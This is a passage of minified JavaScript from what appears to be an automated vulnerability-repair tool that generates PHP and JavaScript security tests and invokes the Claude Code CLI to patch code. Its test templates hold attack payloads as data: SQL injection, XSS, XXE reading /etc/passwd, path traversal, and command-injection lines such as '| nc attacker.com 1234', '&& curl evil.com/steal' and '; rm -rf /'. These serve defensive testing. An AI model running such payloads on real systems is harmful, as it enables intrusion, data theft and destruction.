${Y}`}async generateAITests(X,J,Q){try{let Y=X.file?J[X.file]:void 0,W=this.detectLanguage(X.file||"",Q),G={vulnerabilityType:X.type,language:W,testFramework:Q?.name||"jest",includeE2E:!1},H=await this.aiGenerator.generateTests(X,G,Y);if(!H.success||!H.testSuite)return U.error("AI test generation failed, falling back to template-based"),this.generateGenericTests(X);return{success:!0,framework:Q?.name||"generic",testCode:H.testCode,testSuite:H.testSuite,suggestedFileName:this.suggestFileName(X.file||"test",{framework:Q}),notes:"Tests generated using AI for maximum context awareness"}}catch(Y){return U.error("Error in AI test generation",Y),this.generateGenericTests(X)}}detectLanguage(X,J){if(J){let G={jest:"javascript",mocha:"javascript",vitest:"javascript",cypress:"javascript",pytest:"python",unittest:"python",rspec:"ruby",minitest:"ruby",phpunit:"php",pest:"php",exunit:"elixir"}[J.name.toLowerCase()];if(G)return G}let Q=X.split(".").pop()?.toLowerCase();return{js:"javascript",jsx:"javascript",ts:"typescript",tsx:"typescript",py:"python",rb:"ruby",php:"php",ex:"elixir",exs:"elixir"}[Q||""]||"javascript"}async generateGenericTests(X){let J={vulnerabilityType:X.type,language:"javascript",testFramework:"bun",includeE2E:!1},Q=await this.baseGenerator.generateTestSuite(X,J);if(!Q.success||!Q.testSuite){U.warn(`Base test generation failed for ${X.type}, creating fallback test suite`);let Y=X.type||"unknown_vulnerability",G={red:{testName:`should be vulnerable to ${Y.replace(/_/g," ").toLowerCase()} (RED)`,testCode:`// RED test for ${Y}
const maliciousInput = "test_input";
// TODO: Add test implementation`,attackVector:this.getFallbackAttackVector(Y),expectedBehavior:"should_fail_on_vulnerable_code"}};return{success:!0,framework:"generic",testCode:this.generateGenericTestCode(G,X),testSuite:G,notes:"No test framework detected, using generic template with fallback"}}return{success:!0,framework:"generic",testCode:this.generateGenericTestCode(Q.testSuite,X),testSuite:Q.testSuite,notes:"No test framework detected, using generic template"}}getFallbackAttackVector(X){switch(X.toUpperCase().replace(/-/g,"_")){case"SQL_INJECTION":return"'; DROP TABLE users; --";case"XSS":return'<script>alert("XSS")</script>';case"COMMAND_INJECTION":return"; cat /etc/passwd";case"PATH_TRAVERSAL":return"../../../etc/passwd";case"XML_EXTERNAL_ENTITIES":case"XXE":return'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';default:return"malicious_input"}}async generateTestSuite(X,J){let Q=X.type.toUpperCase();if(X.type==="cross_site_request_forgery")Q="CSRF";else if(X.type==="xss")Q="XSS";let Y={vulnerabilityType:Q,language:this.getLanguageFromFramework(J.name),testFramework:this.mapToBaseFramework(J.name),includeE2E:!1},W=await this.baseGenerator.generateTestSuite(X,Y);if(!W.success||!W.testSuite){if(U.error("Test suite generation failed in generateTestSuite",{success:W.success,error:W.error,vulnerabilityType:X.type}),X.type==="xml_external_entities")return{red:{testName:"should be vulnerable to xml external entities (RED)",testCode:"// Test XXE vulnerability",attackVector:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',expectedBehavior:"should_fail_on_vulnerable_code"},green:{testName:"should prevent xml external entities (GREEN)",testCode:"// Test XXE prevention",validInput:'<?xml version="1.0"?><foo>bar</foo>',expectedBehavior:"should_pass_on_fixed_code"},refactor:{testName:"should maintain functionality after security fix",testCode:"// Test normal XML processing",functionalValidation:["XML parsing works correctly","Valid XML returns expected data"],expectedBehavior:"should_pass_on_both_versions"}};throw Error(`Failed to generate test suite: ${W.error||"Unknown error"}`)}return W.testSuite}suggestFileName(X,J){let Q=X.substring(0,X.lastIndexOf("/")),Y=X.substring(X.lastIndexOf("/")+1),W=Y.substring(0,Y.lastIndexOf(".")),G=Y.substring(Y.lastIndexOf("."));switch(J.fileNaming){case"test":return`${Q}/${W}.test${G}`;case"spec":return`${Q}/${W}.spec${G}`;case"__tests__":return`${Q}/__tests__/${W}${G}`;case"test_prefix":return`${Q}/test_${W}${G}`;default:return`${Q}/${W}.test${G}`}}addCoverageAwareTests(X,J){if(!J.fileCoverage||J.fileCoverage.functions.length===0)return X;let Q=J.fileCoverage.functions.filter((Y)=>Y.hits===0).map((Y)=>Y.name);if(Q.length>0)return`
// Note: Focusing on uncovered functions: ${Q.join(", ")}
`+X;return X}addHelperImports(X,J){let Q=J.filter((W)=>W.includes("import")||W.includes("require")).join(`
`),Y=J.filter((W)=>W.includes("beforeEach")||W.includes("afterEach")).join(`
  `);if(Q)X=Q+`

`+X;if(Y)X=X.replace(/(describe\([^{]+\{)/,`$1
  ${Y}
`);return X}generateNotes(X,J,Q){let Y=[];if(Y.push(`Detected ${X.name} v${X.version||"unknown"}`),J.hasData){if(Y.push("Coverage data available"),J.fileCoverage){let W=J.fileCoverage.lines?.percentage||J.fileCoverage.coverage||"unknown";Y.push(`File coverage: ${W}%`)}if(J.gaps?.recommendations?.length>0)Y.push("Focused on uncovered functions")}else Y.push("No coverage data available");if(Q.style!=="unknown")Y.push(`Using ${Q.style.toUpperCase()} style`);if(Q.assertionStyle!=="unknown")Y.push(`Using ${Q.assertionStyle} assertions`);return Y.join("; ")}getLanguageFromFramework(X){return{jest:"javascript",vitest:"typescript",mocha:"javascript",jasmine:"javascript",pytest:"python",unittest:"python",rspec:"ruby",minitest:"ruby",phpunit:"php",junit:"java",junit5:"java",testng:"java",exunit:"javascript"}[X.toLowerCase()]||"javascript"}mapToBaseFramework(X){return{jest:"jest",vitest:"jest",mocha:"mocha",jasmine:"mocha",cypress:"cypress",pytest:"jest",minitest:"mocha",phpunit:"jest",exunit:"mocha"}[X.toLowerCase()]||"bun"}getRelativeImportPath(X){return X.replace(/\.tsx?$/,"").replace(/^src\//,"../")}getRelativeRequirePath(X){return"./"+X.replace(/\.(js|ts|rb|py|php)$/,"")}extractPackageName(X){let J=X.match(/src\/(?:main|test)\/java\/(.+)\/[^/]+\.java$/);if(J)return J[1].replace(/\//g,".");return"com.example"}extractNamespaceFromPath(X){if(X.includes("app/")){let J=X.match(/app\/(.+)\/[^/]+\.php$/);if(J)return J[1].replace(/\//g,"\\")}else if(X.includes("src/")){let J=X.match(/src\/(.+)\/[^/]+\.php$/);if(J)return J[1].replace(/\//g,"\\")}return""}generateLaravelPHPUnitTests(X,J,Q,Y,W){let G=this.extractRedTests(X);if(G.length===0)return`<?php
// ERROR: No RED tests found in test suite`;let H=this.extractNamespaceFromPath(Q.file||""),z=Q.file?.includes("Controller"),$=G.map((V,K)=>`
    /**
     * @test
     */
    public function it_is_vulnerable_to_${Q.type.toLowerCase()}_${K+1}()
    {
        // RED: ${V.testName}
        $maliciousPayload = '${V.attackVector}';

        $response = $this->postJson('/api/vulnerable-endpoint', [
            'input' => $maliciousPayload
        ]);

        // The vulnerability should allow the attack
        $response->assertStatus(200);
        $this->assertDatabaseMissing('logs', [
            'type' => 'security_violation'
        ]);
    }`).join(`
`);return`<?php

namespace Tests\\Feature;

use Tests\\TestCase;
use Illuminate\\Foundation\\Testing\\RefreshDatabase;
use Illuminate\\Foundation\\Testing\\WithFaker;
use App\\${H?H+"\\":""}${Y};

class ${Y}${Q.type.replace(/_/g,"")}Test extends TestCase
{
    use RefreshDatabase;
${$}
}`}generateSymfonyPHPUnitTests(X,J,Q,Y){let W=this.extractRedTests(X);if(W.length===0)return`<?php
// ERROR: No RED tests found in test suite`;let G=this.extractNamespaceFromPath(Q.file||""),H=W.map((z,$)=>`
    /**
     * @test
     */
    public function test_${Q.type.toLowerCase()}_vulnerability_${$+1}(): void
    {
        // RED: ${z.testName}
        $client = static::createClient();
        $maliciousPayload = '${z.attackVector}';

        $crawler = $client->request('POST', '/vulnerable-route', [
            'data' => $maliciousPayload
        ]);

        // The vulnerability should allow the attack
        $this->assertResponseIsSuccessful();
        $this->assertSelectorNotExists('.error-message');
    }`).join(`
`);return`<?php

namespace App\\Tests\\${G?G+"\\":""}Security;

use Symfony\\Bundle\\FrameworkBundle\\Test\\WebTestCase;
use App\\${G?G+"\\":""}${Y};

class ${Y}${Q.type.replace(/_/g,"")}Test extends WebTestCase
{${H}
}`}generatePestTests(X,J,Q,Y){let W=this.extractRedTests(X);if(W.length===0)return`<?php
// ERROR: No RED tests found in test suite`;let G=Q.file?.split("/").pop()?.replace(/\.php$/,"")||"Class",H=this.extractNamespaceFromPath(Q.file||""),z=H?`App\\${H}\\${G}`:`App\\${G}`,$=Y?.companions?.includes("laravel"),V=$?`use function Pest\\Laravel\\{get, post, put, delete};
use Illuminate\\Foundation\\Testing\\RefreshDatabase;`:`use ${z};
use App\\Exceptions\\SecurityException;`,Z=(()=>{switch(Q.type){case"sql_injection":return`dataset('malicious_sql', [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM passwords--",
    "admin'--",
    "1' AND '1'='1"
]);`;case"command_injection":return`dataset('malicious_commands', [
    "; rm -rf /",
    "| nc attacker.com 1234",
    "\`cat /etc/passwd\`",
    "$(whoami)",
    "&& curl evil.com/steal"
]);`;case"path_traversal":return`dataset('path_traversal_payloads', [
    "../../../etc/passwd",
    "..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd"
]);`;default:return""}})();if($){let B=W.map((M,O)=>`
it('should be vulnerable to ${Q.type.toLowerCase()} - test ${O+1} (RED)', function () {
    // RED: ${M.testName}
    $maliciousPayload = '${M.attackVector}';

    $response = post('/api/vulnerable', [
        'input' => $maliciousPayload
    ]);

    // The vulnerability should allow the attack
    $response->assertStatus(200);
    expect($response->json())->not->toHaveKey('error');
});`).join(`
`);return`<?php

${V}

uses(RefreshDatabase::class);

beforeEach(function () {
    $this->artisan('migrate');
});
${B}

${Z?`
${Z}`:""}`}let q=W.map((B,M)=>`
it('should be vulnerable to ${Q.type.toLowerCase()} - test ${M+1} (RED)', function () {
    // RED: ${B.testName}
    $maliciousInput = '${B.attackVector}';

    $result = $this->instance->process($maliciousInput);

    // Vulnerability should allow the attack
    expect($result)->not->toContain('Permission denied');
    expect($result)->not->toContain('Invalid input');
});`).join(`
`);return`<?php

${V}

beforeEach(function () {
    $this->instance = new ${G}();
});
${q}

${Z?`
${Z}`:""}`}}var UR=s(()=>{VR();TX();I1();KR()});var h6;var m4=s(()=>{S3();zR();UR();I1();h6=class h6 extends E7{frameworkDetector;coverageAnalyzer;issueInterpreter;adaptiveGenerator;constructor(X){super();this.frameworkDetector=new T3,this.coverageAnalyzer=new _3,this.issueInterpreter=new E3,this.adaptiveGenerator=new v3(this.frameworkDetector,this.coverageAnalyzer,this.issueInterpreter,X)}async analyzeWithTestGeneration(X,J,Q,Y){U.info(`Analyzing issue #${X.number} with test generation`);let W=await this.analyzeWithSecurity(X,J,Q,Y),G=W.securityAnalysis?.vulnerabilities||[];if(G.length===0){U.info("No vulnerabilities from security scan, interpreting issue description");let V=await this.issueInterpreter.interpretIssue(X);if(V.vulnerabilityType){let K=this.convertInterpretedIssueToVulnerability(V);G.push(K)}}let H=[],z;if(G.length>0&&Q){let V={};for(let[K,Z]of Q.entries())V[K]=Z;for(let K of G)try{let Z=await this.adaptiveGenerator.generateAdaptiveTests(K,V);if(Z.success&&Z.testSuite){if(H.push({framework:Z.framework,testCode:Z.testCode,testSuite:Z.testSuite,suggestedFileName:Z.suggestedFileName,notes:Z.notes}),!z)z=Z.testSuite}}catch(Z){U.error(`Failed to generate tests for vulnerability: ${K.type}`,Z)}}let $={...W,generatedTests:{success:H.length>0,testSuite:z,tests:H,error:H.length===0&&G.length>0?"Failed to generate tests for detected vulnerabilities":void 0}};return U.info(`Generated ${H.length} test(s) for issue #${X.number}`),$}convertInterpretedIssueToVulnerability(X){return{type:{"sql-injection":"SQL_INJECTION",xss:"XSS","command-injection":"COMMAND_INJECTION","path-traversal":"PATH_TRAVERSAL",xxe:"XXE",ssrf:"SSRF","insecure-deserialization":"INSECURE_DESERIALIZATION"}[X.vulnerabilityType]||X.vulnerabilityType.toUpperCase(),severity:X.severity||"medium",filePath:X.affectedFiles?.[0]||"unknown",line:X.affectedLines?.[0]||0,description:X.description||"Security vulnerability detected",confidence:80,message:X.description||"Security vulnerability detected"}}}});import{execSync as u4}from"child_process";import{writeFileSync as ZR,unlinkSync as qR,mkdirSync as Tv1,rmSync as _v1}from"fs";import{join as BR,dirname as Ev1}from"path";import{tmpdir as kv1}from"os";function f3(X){if(X.redTests&&Array.isArray(X.redTests))return X.redTests;if(X.red)return[X.red];return[]}class oX{repoPath;workDir;constructor(X=process.cwd()){this.repoPath=X;this.workDir=BR(kv1(),`test-validator-${Date.now()}`)}async validateFixWithTests(X,J,Q){try{U.info(`Validating fix: ${X} -> ${J}`);let Y=f3(Q);if(Y.length===0)throw Error("No RED tests found in test suite");U.info(`Running ${Y.length} RED test(s) for validation`);let W=this.createTestFile(Q),G=BR(this.workDir,"validation.test.js");Tv1(Ev1(G),{recursive:!0}),ZR(G,W);let H=await this.runTestsOnCommit(X,G,Q),z=await this.runTestsOnCommit(J,G,Q);try{qR(G),_v1(this.workDir,{recursive:!0,force:!0})}catch(V){}let $=this.validateResults(H,z);return{success:!0,vulnerableCommit:H,fixedCommit:z,isValidFix:$,error:$?void 0:"Fix validation failed - tests do not confirm vulnerability was fixed"}}catch(Y){return U.error("Test validation failed",Y),{success:!1,vulnerableCommit:{redTestsPassed:[],allPassed:!1},fixedCommit:{redTestsPassed:[],allPassed:!1},isValidFix:!1,error:Y instanceof Error?Y.message:"Unknown error"}}}async runTestsOnCommit(X,J,Q){let Y=f3(Q),W=u4("git rev-parse --abbrev-ref HEAD",{cwd:this.repoPath,encoding:"utf-8"}).trim();try{u4(`git checkout ${X} --quiet`,{cwd:this.repoPath});let G=Y.map((z,$)=>this.runSingleTest(J,$)),H=G.every((z)=>z);return{redTestsPassed:G,allPassed:H}}finally{u4(`git checkout ${W} --quiet`,{cwd:this.repoPath})}}runSingleTest(X,J){try{let Q=`
        const { execSync } = require('child_process');
        const fs = require('fs');
        const path = require('path');

        // Load test suite
        const testSuite = require('${X}');
        const test = testSuite.redTests[${J}];

        if (!test) {
          console.error('Test not found at index ${J}');
          process.exit(1);
        }

        // Create a proper test file with the test framework
        const testFileContent = \`
          // Minimal test runner for validation
          const assert = require('assert');

          // Mock test function if not available
          if (typeof test === 'undefined') {
            global.test = async (name, fn) => {
              console.log('Running test:', name);
              try {
                await fn();
                console.log('✓ Test passed');
              } catch (error) {
                console.error('✗ Test failed:', error.message);
                throw error;
              }
            };
          }

          // Mock expect if not available
          if (typeof expect === 'undefined') {
            global.expect = (actual) => ({
              toBe: (expected) => assert.strictEqual(actual, expected),
              toBeTruthy: () => assert.ok(actual),
              toBeFalsy: () => assert.ok(!actual),
              toContain: (substring) => assert.ok(actual.includes(substring)),
              not: {
                toBe: (expected) => assert.notStrictEqual(actual, expected),
                toContain: (substring) => assert.ok(!actual.includes(substring))
              }
            });
          }

          // Execute the test
          (async () => {
            try {
              \${test.testCode}
              process.exit(0);
            } catch (error) {
              console.error('Test execution failed:', error.message);
              process.exit(1);
            }
          })();
        \`;

        // Write and execute test file
        const tempTestFile = '${X.replace(".test.js","")}.red_${J}.runner.js';
        fs.writeFileSync(tempTestFile, testFileContent);

        try {
          execSync(\`node \${tempTestFile}\`, {
            cwd: '${this.repoPath}',
            stdio: 'pipe'
          });
          fs.unlinkSync(tempTestFile);
          process.exit(0);
        } catch (error) {
          fs.unlinkSync(tempTestFile);
          process.exit(1);
        }
      `,Y=X.replace(".test.js",`.red_${J}.wrapper.js`);return ZR(Y,Q),u4(`node ${Y}`,{cwd:this.repoPath,stdio:"pipe"}),qR(Y),!0}catch(Q){return U.debug(`RED test ${J} failed:`,Q),!1}}createTestFile(X){let J=(W)=>W.replace(/`/g,"\\`").replace(/\$/g,"\\$");return`
// RFC-060: Generated RED test file for vulnerability validation
const assert = require('assert');

module.exports = {
  redTests: [
${f3(X).map((W,G)=>`  {
    testName: "${W.testName}",
    testCode: \`${J(W.testCode)}\`,
    attackVector: "${W.attackVector||""}",
    expectedBehavior: "${W.expectedBehavior}"
  }`).join(`,
`)}
  ]
};

// Export for direct execution
if (require.main === module) {
  (async () => {
    console.log('Running vulnerability validation tests (RED only)...');

    // Run all RED tests
    for (let i = 0; i < module.exports.redTests.length; i++) {
      const test = module.exports.redTests[i];
      console.log(\`Running RED test \${i + 1}: \${test.testName}\`);
      try {
        await eval(test.testCode);
        console.log(\`✓ RED test \${i + 1} passed\`);
      } catch (error) {
        console.log(\`✗ RED test \${i + 1} failed: \${error.message}\`);
      }
    }
  })();
}
`}validateResults(X,J){let Q=!X.allPassed,Y=J.allPassed,W=Q&&Y;if(!W)U.warn("Validation failed:"),U.warn(`  Vulnerable code - RED tests failed (expected): ${Q}`),U.warn(`  Fixed code - RED tests passed (expected): ${Y}`);return W}}var c4=s(()=>{I1()});import{spawn as bv1}from"child_process";class x3{claudeConfig;repoPath;credentialManager;constructor(X,J=process.cwd(),Q){this.claudeConfig=X,this.repoPath=J,this.credentialManager=Q}async generateSolution(X,J,Q){try{U.info("Using Claude Code CLI for file editing...");let Y=process.env.ANTHROPIC_API_KEY;if(!Y&&this.credentialManager)try{if(Y=this.credentialManager.getCredential("anthropic"),Y)U.info("Using vended credentials for Claude Code CLI")}catch(V){U.warn("Failed to get vended credentials:",V)}if(!Y)return{success:!1,message:"CLI execution failed",error:"ANTHROPIC_API_KEY environment variable or vended credentials required for CLI approach"};let W=Q||this.constructPrompt(X,J);U.info(`Working directory: ${this.repoPath}`),U.info(`Prompt length: ${W.length} characters`);let G=await this.executeCLI(W,{cwd:this.repoPath,env:{...process.env,ANTHROPIC_API_KEY:Y}});if(!G.success)return{success:!1,message:G.error||"Claude Code CLI execution failed",error:G.error};let H=this.getModifiedFiles();if(H.length===0)return{success:!1,message:"No files were modified by Claude Code CLI",error:"Claude Code CLI did not make any file changes"};U.info(`Files modified by Claude Code CLI: ${H.join(", ")}`);let z={},$=G.output?.match(/```(?:json)?\s*(\{[\s\S]*?\})\s*```/);if($)try{let V=JSON.parse($[1]);if(V.files&&Array.isArray(V.files))V.files.forEach((K)=>{if(K.path&&K.changes)z[K.path]=K.changes})}catch(V){U.debug("Could not parse JSON from CLI output")}return{success:!0,message:`Successfully fixed vulnerabilities in ${H.length} file(s)`,changes:z,messages:[{type:"cli_output",content:G.output}]}}catch(Y){return U.error("Claude Code CLI execution failed:",Y),{success:!1,message:"CLI execution failed",error:Y instanceof Error?Y.message:String(Y)}}}executeCLI(X,J){return new Promise((Q)=>{let Y=setTimeout(()=>{if(U.warn("Claude CLI execution timed out after 20 minutes"),W&&!W.killed)W.kill("SIGTERM");Q({success:!1,error:"Claude CLI execution timed out after 20 minutes"})},1200000),W,G=process.env.CLAUDE_MODEL?["--model",process.env.CLAUDE_MODEL]:[],H=[["claude",["--print","--permission-mode","acceptEdits",...G,"-"]],["bunx",["@anthropic-ai/claude-code","--print","--permission-mode","acceptEdits",...G,"-"]],["bun",["node_modules/@anthropic-ai/claude-code/cli.js","--print","--permission-mode","acceptEdits",...G,"-"]]],z=0,$=()=>{if(z>=H.length){Q({success:!1,error:"Could not find Claude Code CLI via bunx, bun, or global install"});return}let[V,K]=H[z];U.info(`Attempting: ${V} ${K.join(" ")}`),z++,W=bv1(V,K,{...J,stdio:["pipe","pipe","pipe"]}),W.stdin.write(X),W.stdin.end();let Z="",q="";W.stdout?.on("data",(B)=>{let M=B.toString();Z+=M,U.debug(`Claude CLI stdout: ${M.slice(0,200)}`),process.stdout.write(M)}),W.stderr?.on("data",(B)=>{let M=B.toString();q+=M,process.stderr.write(M)}),W.on("close",(B)=>{if(clearTimeout(Y),B===0)Q({success:!0,output:Z});else Q({success:!1,error:`Claude CLI exited with code ${B}. stderr: ${q}`})}),W.on("error",(B)=>{if(z<H.length)U.debug(`Command ${V} failed with: ${B.message}, trying next approach...`),$();else clearTimeout(Y),Q({success:!1,error:`Failed to start Claude CLI: ${B.message}`})})};$()})}getModifiedFiles(){try{let{execSync:X}=Q0("child_process"),J=X("git diff --name-only",{cwd:this.repoPath,encoding:"utf-8"}).trim();return J?J.split(`
`):[]}catch(X){return U.error("Failed to get modified files:",X),[]}}constructPrompt(X,J){if(this.claudeConfig?.useStructuredPhases)return this.constructStructuredPhasedPrompt(X,J);return`You are an expert security engineer fixing vulnerabilities using Test-Driven Development (TDD) methodology.

## Issue Details:
- **Title**: ${X.title}
- **Description**: ${X.body}
- **Complexity**: ${J.complexity}
- **Files with vulnerabilities**: ${J.relatedFiles?.join(", ")||"To be discovered"}

## CRITICAL: Use TDD Red-Green-Refactor Methodology

### Phase 1: RED - Prove the Vulnerability Exists
- Use Read to understand the vulnerable code
- Identify how the vulnerability can be exploited
- Document a test that WOULD exploit the vulnerability (e.g., for XSS: injecting '<script>alert("XSS")</script>')

### Phase 2: GREEN - Fix the Vulnerability
- Use Edit or MultiEdit tools to fix the security issue
- For XSS: Add proper HTML escaping/sanitization
- For SQL Injection: Use parameterized queries
- Make minimal changes that prevent the exploit

### Phase 3: REFACTOR - Ensure Quality
- Verify legitimate functionality still works
- Clean up the fix if needed
- Ensure no regressions were introduced

### Phase 4: Provide Fix Summary (ONLY AFTER EDITING FILES)
After completing the TDD cycle and editing files, provide this JSON:

\`\`\`json
{
  "title": "Fix [vulnerability type] in [component]",
  "description": "Clear explanation of what was vulnerable and how you fixed it",
  "files": [
    {
      "path": "path/to/file.js",
      "changes": "Complete fixed code content (use Read to get it if needed)"
    }
  ],
  "tests": [
    "RED test validates that malicious input like '<script>alert(\\"XSS\\")</script>' in [field] is properly escaped and cannot execute",
    "GREEN test ensures the fix prevents XSS by escaping dangerous characters in [field] input",
    "REFACTOR test confirms that valid [functionality] still works correctly and [feature] loads properly"
  ]
}
\`\`\`

Remember: Follow TDD - understand vulnerability (RED), fix it (GREEN), ensure quality (REFACTOR), THEN provide JSON.`}constructStructuredPhasedPrompt(X,J){return`You are an expert security engineer using Test-Driven Development (TDD) to fix vulnerabilities.

## \uD83D\uDEA8 CRITICAL: FOLLOW TDD RED-GREEN-REFACTOR METHODOLOGY \uD83D\uDEA8

## PHASE 1: RED - UNDERSTAND THE VULNERABILITY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Locate the vulnerability: ${X.title}
   - Description: ${X.body}
   - Related files: ${J.relatedFiles?.join(", ")||"To be discovered"}

2. Use Read to examine the vulnerable code

3. Identify the attack vector (e.g., for XSS: '<script>alert("XSS")</script>')

## PHASE 2: GREEN - FIX THE VULNERABILITY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Use Edit or MultiEdit tools to fix the vulnerable code
   - For XSS: Escape HTML entities (&, <, >, ", ')
   - For SQL Injection: Use parameterized queries
   - Make minimal changes that block the exploit

2. After editing, use Read tool to verify your fix

3. Say "GREEN PHASE COMPLETE: Vulnerability fixed" when done

## PHASE 3: REFACTOR - ENSURE QUALITY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Verify legitimate functionality still works
2. Clean up code if needed
3. Say "REFACTOR COMPLETE: Code quality verified"

## PHASE 4: JSON SUMMARY (ONLY AFTER ALL PHASES)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Provide this JSON with TDD test descriptions:

\`\`\`json
{
  "title": "Fix [vulnerability type] in [component]",
  "description": "Clear explanation using TDD: RED (vulnerability existed), GREEN (fix applied), REFACTOR (quality ensured)",
  "files": [
    {
      "path": "path/to/edited/file.js",
      "changes": "Complete file content after your edits (read it back with Read tool)"
    }
  ],
  "tests": [
    "RED test: Validates that malicious input like '<script>alert(\\"XSS\\")</script>' would have been exploitable before fix",
    "GREEN test: Ensures the fix prevents the vulnerability by properly escaping/sanitizing input",
    "REFACTOR test: Confirms legitimate functionality (e.g., livereload) still works correctly"
  ]
}
\`\`\`

## TDD Checklist:
□ RED: Understood vulnerability and attack vector
□ GREEN: Applied fix using Edit/MultiEdit tools
□ REFACTOR: Verified no regressions
□ Provided JSON with TDD test descriptions

Remember: Follow TDD methodology - RED (understand), GREEN (fix), REFACTOR (verify), then JSON.`}}var MR=s(()=>{I1()});function jR(){return process.env.RSOLV_DEV_MODE==="true"||process.env.USE_CLAUDE_CODE_MAX==="true"}var k7;var h3=s(()=>{MR();I1();k7=class k7 extends x3{defaultRetryConfig={maxAttempts:parseInt(process.env.RSOLV_RETRY_MAX_ATTEMPTS||"3"),initialDelayMs:parseInt(process.env.RSOLV_RETRY_INITIAL_DELAY_MS||"1000"),maxDelayMs:parseInt(process.env.RSOLV_RETRY_MAX_DELAY_MS||"30000"),backoffMultiplier:parseFloat(process.env.RSOLV_RETRY_BACKOFF_MULTIPLIER||"2"),retryableErrors:["rate_limit","overloaded","timeout","network","ECONNRESET","ETIMEDOUT","ENOTFOUND","EHOSTUNREACH","Claude CLI exited with code"]};async generateSolution(X,J,Q){try{U.info("Using RetryableClaudeCodeCLI for file editing...");let Y=jR(),W=await this.getApiKey(Y);if(!W)return{success:!1,message:"No API key available",error:Y?"Claude Code Max API key not configured for development mode. Set CLAUDE_CODE_MAX_API_KEY or ANTHROPIC_API_KEY":"No API key or vended credentials available"};process.env.ANTHROPIC_API_KEY=W,U.info(`Using ${Y?"Claude Code Max (dev)":"production"} API`);let G=Q||this.constructPrompt(X,J);U.info(`Working directory: ${this.repoPath}`),U.info(`Prompt length: ${G.length} characters`);let H=await this.executeWithRetry(G,{cwd:this.repoPath,env:{...process.env,ANTHROPIC_API_KEY:W}});if(!H.success)return H;let z=this.getModifiedFiles();if(z.length===0)return{success:!1,message:"No files were modified by Claude Code CLI",error:"Claude Code CLI did not make any file changes"};U.info(`Files modified by Claude Code CLI: ${z.join(", ")}`);let $={};for(let V of z)$[V]="Modified by Claude Code CLI";return{success:!0,message:`Successfully modified ${z.length} file(s)`,changes:$}}catch(Y){return U.error("Failed to generate solution with retry:",Y),{success:!1,message:"Failed to generate solution",error:Y instanceof Error?Y.message:String(Y)}}}async executeWithRetry(X,J,Q){let Y={...this.defaultRetryConfig,...Q},W=null;for(let G=1;G<=Y.maxAttempts;G++){try{U.info(`Attempt ${G}/${Y.maxAttempts}: Executing Claude Code CLI`);let H=await this.executeCLI(X,J);if(H.success){if(G>1)U.info(`Succeeded on attempt ${G} after ${G-1} retry(ies)`);return{success:!0,message:H.output||"Operation completed successfully"}}if(!this.isRetryableError(H.error,Y.retryableErrors)){if(U.warn(`Non-retryable error: ${H.error}`),this.isAuthenticationError(H.error))this.logAuthenticationFailureDebugInfo();return{success:!1,message:H.error||"Operation failed",error:H.error}}W=Error(H.error||"Unknown error"),U.warn(`Retryable error on attempt ${G}: ${H.error}`)}catch(H){if(W=H,!this.isRetryableError(W.message,Y.retryableErrors))throw U.error(`Non-retryable exception: ${W.message}`),H;U.warn(`Retryable exception on attempt ${G}: ${W.message}`)}if(G<Y.maxAttempts){let H=Math.min(Y.initialDelayMs*Math.pow(Y.backoffMultiplier,G-1),Y.maxDelayMs);U.info(`Retrying in ${H}ms (exponential backoff)...`),await this.sleep(H)}}return U.error(`Failed after ${Y.maxAttempts} attempts. Last error: ${W?.message}`),{success:!1,message:`Failed after ${Y.maxAttempts} attempts`,error:W?.message||"Unknown error"}}isRetryableError(X,J){if(!X)return!1;let Q=X.toLowerCase();return J.some((Y)=>Q.includes(Y.toLowerCase()))}sleep(X){return new Promise((J)=>setTimeout(J,X))}async getApiKey(X){if(X){let Y=process.env.CLAUDE_CODE_MAX_API_KEY;if(Y)return U.debug("Using Claude Code Max API key from CLAUDE_CODE_MAX_API_KEY"),this.validateAndLogCredentialFormat(Y,"CLAUDE_CODE_MAX_API_KEY"),Y;let W=process.env.ANTHROPIC_API_KEY;if(W)return U.debug("Using regular API key in dev mode (CLAUDE_CODE_MAX_API_KEY not set)"),this.validateAndLogCredentialFormat(W,"ANTHROPIC_API_KEY"),W;return}let J,Q="unknown";if(this.credentialManager){U.info("Credential manager available, attempting to get Anthropic credentials");try{if(J=await this.credentialManager.getCredential("anthropic"),U.info(`Got credential from manager: ${J?"API key received (length: "+J.length+")":"No API key returned"}`),J)U.info("Using vended credentials for production mode"),Q="vended"}catch(Y){U.warn("Failed to get vended credentials:",Y)}}else U.info("No credential manager available");if(!J){if(J=process.env.ANTHROPIC_API_KEY,J)U.debug("Using environment ANTHROPIC_API_KEY"),Q="environment"}if(J)this.validateAndLogCredentialFormat(J,Q);return J}validateAndLogCredentialFormat(X,J){if(U.debug("Credential format validation starting..."),U.debug(`API key length: ${X.length}`),U.debug(`API key prefix: ${X.substring(0,Math.min(8,X.length))}...`),U.debug(`Credential source: ${J}`),this.isValidAnthropicApiKeyFormat(X))U.debug("Credential format validation: PASSED - Valid Anthropic API key format detected");else if(U.warn("Credential format validation: FAILED - credential format may be incompatible with Claude CLI"),U.warn(`Expected format: sk-ant-api03-... but got prefix: ${X.substring(0,Math.min(12,X.length))}...`),X.startsWith("rsolv_"))U.warn("Credential validation: RSOLV vended format detected - may need conversion for Claude CLI compatibility");else if(X.length<20)U.warn("Credential validation: API key appears too short for Anthropic format");else U.warn("Credential validation: Unknown API key format - proceeding but authentication may fail");if(U.debug(`ANTHROPIC_API_KEY environment variable set: ${!!process.env.ANTHROPIC_API_KEY}`),process.env.ANTHROPIC_API_KEY&&process.env.ANTHROPIC_API_KEY!==X)U.debug("Note: Using different credential than ANTHROPIC_API_KEY environment variable")}isValidAnthropicApiKeyFormat(X){if(!X||typeof 